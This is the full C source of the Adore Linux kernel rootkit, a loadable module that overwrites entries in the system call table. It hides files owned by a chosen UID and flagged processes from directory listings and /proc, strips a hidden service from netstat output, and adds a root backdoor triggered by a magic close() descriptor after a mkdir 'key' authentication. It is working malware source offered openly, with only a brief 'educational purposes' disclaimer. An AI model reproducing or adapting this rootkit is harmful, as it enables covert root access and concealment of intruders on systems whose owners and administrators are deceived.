/*** (C) 2001 by Stealth -- http://spider.scorpions.net/~stealth
 ***	
 ***
 *** (C)'ed Under a BSDish license. Please look at LICENSE-file.
 *** SO YOU USE THIS AT YOUR OWN RISK!
 *** YOU ARE ONLY ALLOWED TO USE THIS IN LEGAL MANNERS. 
 *** !!! FOR EDUCATIONAL PURPOSES ONLY !!!
 ***
 ***	-> Use ava to get all the things workin'.
 ***
 *** Greets fly out to all my friends. You know who you are. :)
 *** Special thanks to Shivan for granting root access to his
 *** SMP box for adore-development. More thx to skyper for also
 *** granting root access.
 ***
 ***/
#define MODULE 
#define __KERNEL__


#ifdef MODVERSIONS
#include <linux/modversions.h>
#endif

#include <linux/config.h>
#include <linux/stddef.h>
#include <linux/module.h>
#include <linux/kernel.h>

#include <linux/proc_fs.h>
#include <linux/sched.h>
#include <linux/dirent.h>
#include <linux/fs.h>

#include <linux/malloc.h>
#include <linux/unistd.h>
#include <linux/string.h>
#include <sys/syscall.h>
#include <linux/dcache.h>

#include <linux/dirent.h>
#include <linux/file.h>
#include <asm/uaccess.h>
#include <linux/smp_lock.h>
#include <linux/capability.h>

/* To hide promisc flag */
#define IFF_INVISIBLE 0x1	
#define IFF_HACKED    0x2

/* to hide a pid */
#define PF_INVISIBLE 0x1000000

/* to check whether request is legal */
#define PF_AUTH ((PF_INVISIBLE)<<1)

/* used to set flags of task-struct to
 * PF_INVISIBLE and back
 */
/* whenever you change this, don't forget to do so
 * in libinvisible too!!!
 */
#define SIGINVISIBLE 100
#define SIGVISIBLE   101
#define SIGREMOVE    102

/* The ioctl special-command */
#ifndef ELITE_CMD
#error "No ELITE_CMD given!"
#endif

#ifndef ELITE_UID
#error "No ELITE_UID given!"
#endif

#ifndef ADORE_KEY
#error "No ADORE_KEY given!"
#endif

#define ADORE_VERSION CURRENT_ADORE


/* assigned by init_module
 */
struct task_struct *init_hook = NULL;

/* own version. kernel's doesn't work in modules
 */
#undef for_each_task
#define for_each_task(p) for (p = init_hook; (p = p->next_task) != init_hook;)

extern void *sys_call_table[];

int (*o_getdents)(unsigned int, struct dirent *, unsigned int);
int (*o_kill)(int, int);
int (*o_write)(unsigned int, char *, size_t);
int (*o_fork)(struct pt_regs);
int (*o_clone)(struct pt_regs);
int (*o_close)(unsigned int);
int (*o_symlink)(const char *, const char*);
long (*o_mkdir)(const char *, int);

#ifdef EXEC_REDIRECT
#include <linux/ptrace.h>
int (*o_execve)(struct pt_regs);
extern int n_execve(struct pt_regs);
#endif
	
/* Protypes
 */
int update_logstruct();
int cleanup_module();
int hide_process(pid_t);
int remove_process(pid_t);
int unhide_process(pid_t);
int strip_invisible();
int unstrip_invisible();
int is_invisible(pid_t);
int is_secret(struct super_block *, struct dirent *);

int my_atoi(const char *);
struct task_struct *my_find_task(pid_t);

extern struct module *module_list;

/* base = 10 
 * Special atoi: makes "/proc/478" 478 */
int my_atoi(const char *str)
{
	int ret = 0, mul = 1;
	const char *ptr;
    
	for (ptr = str; *ptr; ptr++)
		;        
	ptr--;
        while (ptr >= str) {
		if (*ptr < '0' || *ptr > '9')
            		break;
		ret += (*ptr - '0') * mul;
		mul *= 10;
		ptr--;
	}
	return ret;
}

/* Own implementation of find_task_by_pid()
 */
struct task_struct *my_find_task(pid_t pid)
{
	struct task_struct *p;
	
	for_each_task(p) {
		if (p->pid == pid)
			return p;
	}
	return NULL;
}


/* Look whether the PID holds the PF_INVISIBLE flag
 */
int is_invisible(pid_t pid)
{
	struct task_struct *p;
    
	if (pid < 0) 
		return 0;
    
	if ((p = my_find_task(pid)) == NULL)
		return 0;
	
	return ((p->flags & PF_INVISIBLE) == PF_INVISIBLE);
}

/* Look whether a file, with inode# 'ino' is hidden
 */
int is_secret(struct super_block *sb, struct dirent *d)
{
	struct inode *inode;
	int ret;
	
	if (!sb || !d)
		return 0;
	
	if (strcmp(d->d_name, ".") == 0 || strcmp(d->d_name, "..") == 0)
		return 0;
	
	if ((inode = iget(sb, d->d_ino)) == NULL)
		return 0;
	
	/* Is it hidden ? */
	if (inode->i_uid == ELITE_UID)
		ret = 1;
	else
		ret = 0;
	
	iput(inode);
	return ret;
}
		

/* Mark a process for invisibility.
 */
int hide_process(pid_t pid)
{
	struct task_struct *p;
	
	/* Nobody may mess with swapper+init
	 */
	if (pid <= 1)
		return -1;
		
        if ((p = my_find_task(pid)) == NULL)
	        return -1;

	p->flags |= (PF_INVISIBLE|PF_AUTH);	
        return 0;
}

/* Remove process from task-struct
 */
int remove_process(pid_t pid)
{
	struct task_struct *p;

	/* Nobody may mess with swapper+init
	 */
	if (pid <= 1)
		return -1;

        if ((p = my_find_task(pid)) == NULL)
	        return -1;

	/* Must not have childs */
	if (p->p_cptr != NULL)
		return -1;

	/* from sched.h */
	REMOVE_LINKS(p);
        return 0;
}


/* Make process visible again. (un-mark it)
 */
int unhide_process(pid_t pid)
{
	struct task_struct *p = my_find_task(pid);
	
	if (!p)
		return -1;

	p->flags &= ~(PF_INVISIBLE|PF_AUTH);
	return 0;
}
	

/* Actually, do the hack. Change all PF_INVISIBLE proc's
 * PID to 0, making them disappear for proc's
 * get_pid_list(). */
int strip_invisible()
{
	struct task_struct *p;
	

	for_each_task(p) {
		if (p->flags & PF_INVISIBLE) {
		
			/* temorary save PID in exit_code */
			p->exit_code = p->pid;
			p->pid = 0;
		}
	}
	return 0;
}

/* ditto (reverse)
 */
int unstrip_invisible()
{
	struct task_struct *p;
	
	for_each_task(p) {
		if (p->flags & PF_INVISIBLE) {
			p->pid = p->exit_code;
			p->exit_code = 0;
		}
	}
	return 0;
}


/* remove all files from dirent, which are secret
 */
int n_getdents(unsigned int fd, struct dirent *dirp, unsigned int count)
{
	int ret, proc = 0, offset, r;

	struct inode *dinode;
	struct file *file;
	char *ptr;
	struct dirent *curr, *prev = NULL, *d, *orig_d;
	struct super_block *sb;

	lock_kernel();

	if ((file = fget(fd)) == NULL) {
		unlock_kernel();
		return -EBADF;
	}
	
	/* Fetch the right superblock for this directory (fd) 
	 */
	sb = file->f_dentry->d_sb;
	dinode = file->f_dentry->d_inode;
    
    
	/* are we in /proc ?
	 */
	if (dinode->i_ino == PROC_ROOT_INO) // && !MAJOR(dinode->i_dev) &&
	//    MINOR(dinode->i_dev) == 1)
		proc = 1;

/*#define USE_NEW_PROCS*/
/* define if you want to use new process hiding
 * technique */
#ifdef USE_NEW_PROCS	
	/* OK. if we are in proc, strip invisible processes
         */
	if (proc)
		strip_invisible();
#endif
	
	ret = o_getdents(fd, dirp, count);
	

#ifdef USE_NEW_PROCS
	/* Make them appear with normal PID again
         */
	if (proc)
		unstrip_invisible();
#endif
	
	if (ret <= 0)
		goto out;

	if ((d = kmalloc(ret, GFP_KERNEL)) == NULL)
		goto out;
	copy_from_user(d, dirp, ret);
	orig_d = d;
	
	ptr = (char*)d;	
	r = ret;
	
	while (ptr < (char *)orig_d + r) {
		curr = (struct dirent *)ptr;
		
		offset = curr->d_reclen;	/* offset to next entry */

#ifdef USE_NEW_PROCS
		if (is_secret(sb, curr)) {
#else
		if (is_secret(sb, curr) || (proc && is_invisible(my_atoi(curr->d_name)))) {
#endif
			if (!prev) {		/* if first entry is hidden 	*/
				ret -= offset;	/* cut it off			*/
				d = (struct dirent*)((char*)d + offset);
			} else {		/* not first			*/
				prev->d_reclen += offset;
				memset(curr, 0, offset);
			}
		} else
			prev = curr;
			
		ptr += offset;
		
	}
	copy_to_user(dirp, d, ret);
	kfree(orig_d);
out:
	fput(file);
	unlock_kernel();
	return ret;
}


/* The new fork. Its task is to inherit the PF_INVISIBLE
 * to childs.
 */
int n_fork(struct pt_regs regs)
{
	pid_t pid;
	int hide = 0;
    
	lock_kernel();
	if (is_invisible(current->pid))
    		++hide;
    
	pid = o_fork(regs);

	if (hide && pid >= 0)
    		hide_process(pid);
    	unlock_kernel();
	return pid;
}


int n_clone(struct pt_regs regs)
{
	pid_t pid;
	int hide = 0;
    
	lock_kernel();
	if (is_invisible(current->pid))
		++hide;
    
	pid = o_clone(regs);
	if (hide && pid > 0)
		hide_process(pid);
    	unlock_kernel();
	return pid;
}


int n_kill(pid_t pid, int sig)
{
	struct task_struct *p;
	int ret;
	
	lock_kernel();
	
	if (sig != SIGINVISIBLE && sig != SIGVISIBLE && sig != SIGREMOVE) {
		/* If someone from outside try's to send signals to
		 * us, refuse (except init) */
		if (is_invisible(pid) && !is_invisible(current->pid) && current->pid != 1)
			ret = -ESRCH;
		else
			ret = o_kill(pid, sig);

		unlock_kernel();
		return ret;
	}
    
	/* authenticated? */
	if ((current->flags & PF_AUTH) != PF_AUTH) {
		ret = -ESRCH;
		goto out;
	}
		
	if ((p = my_find_task(pid)) == NULL) {
        	ret = -ESRCH;
		goto out;
	}
    
	if (current->uid && current->euid) {
		ret = -EPERM;
		goto out;
	}
    
	if (sig == SIGINVISIBLE) 
        	ret = hide_process(pid);
	else if (sig == SIGREMOVE)
		ret = remove_process(pid);
	else
        	ret = unhide_process(pid);

out:
    	unlock_kernel();
	return ret;
}


#ifndef HIDDEN_SERVICE 
#define HIDDEN_SERVICE ":hell"
#endif

/* Woa! Incredible. We don't hide by read() but by write() !!!
 * Groundbreaking new and effective.
 */
int n_write(unsigned int fd, char *buf, size_t count)
{
	char tmp[2000];
	int r;
	
	lock_kernel();
	
	/* Is it netstat ?
	 */
	if (strcmp(current->comm, "netstat") == 0 ) {
		memset(tmp, 0, sizeof(tmp));
		copy_from_user(tmp, buf, sizeof(tmp)-1);		
		if (strstr(tmp, HIDDEN_SERVICE)) {
			unlock_kernel();
			return count;
		}
	}

	r = o_write(fd, buf, count);
	unlock_kernel();
	return r;
}


/* The rootshell-backdoor
 */
int n_close(unsigned int fd)
{
	int r;
	
	lock_kernel();
   	switch (fd) {
	case ELITE_CMD:
		if ((current->flags & PF_AUTH) != PF_AUTH) {
			r = -EPERM;
			break;
		}

    		/* Raise normal UID stuff ... */
		current->uid = current->euid = 0;
    		current->gid = current->egid = 0;
    		current->suid = current->sgid = 0;
    		current->fsuid = current->fsgid = 0;
		
		/* ... as well as new Capabilities */
		cap_t(current->cap_effective) = ~0;
		cap_t(current->cap_inheritable) = ~0;
		cap_t(current->cap_permitted) = ~0;

		r = 0;
		break;

	/* to uninstall adore */
	case ELITE_CMD + 1:	
		if ((current->flags & PF_AUTH) != PF_AUTH) {
			r = -EPERM;
			break;
		}

		r = cleanup_module();
		break;

	/* to check whether adore is installed */
	case ELITE_CMD + 2:
		if ((current->flags & PF_AUTH) != PF_AUTH) {
			r = -EPERM;
			break;
		}

		r = ADORE_VERSION;
		break;
	/* just the normal setuid() */
	default:
		r = o_close(fd);
		break;
	}
	unlock_kernel();
	return r;
}

/* "Authenticate" before you can use any adore functions */
long n_mkdir(const char *path, int mode)
{
	char key[64];
	long r, l;

	lock_kernel();

	if ((l = strlen_user(path)) < sizeof(key)) {
		memset(key, 0, sizeof(key));
		copy_from_user(key, path, l);

		if (strcmp(key, ADORE_KEY) == 0) {
			current->flags |= PF_AUTH;
			unlock_kernel();
			return 1;
		}
	}
	r = o_mkdir(path, mode);
	unlock_kernel();
	return r;
}

int init_module(void)
{
	struct task_struct *p = current;

	lock_kernel();
	
    	EXPORT_NO_SYMBOLS;

	/* Fill in init_hook (Eisbein mit Sauerkraut :)
 	 */
	for (; p->pid != 1; p = p->next_task)
		;
	init_hook = p;



#define REPLACE(x) o_##x = sys_call_table[__NR_##x];\
			sys_call_table[__NR_##x] = n_##x

	REPLACE(write);
	REPLACE(getdents);
	REPLACE(kill);
   	REPLACE(fork);
	REPLACE(clone); 
   	REPLACE(close); 
	REPLACE(mkdir);

#ifdef EXEC_REDIRECT
	REPLACE(execve);
#endif	

	unlock_kernel();
	return 0;
}


int cleanup_module(void)
{
	/* need unlock_kernel() b/c this function may be called
	 * from within adore
	 */
	lock_kernel();

#define RESTORE(x) sys_call_table[__NR_##x] = o_##x

	RESTORE(write);
	RESTORE(getdents);
	RESTORE(kill);
	RESTORE(fork);
	RESTORE(clone);
	RESTORE(close);    
	RESTORE(mkdir);

#ifdef EXEC_REDIRECT
	RESTORE(execve);
#endif
	
	/* ditto */
	unlock_kernel();
	return 0;
}

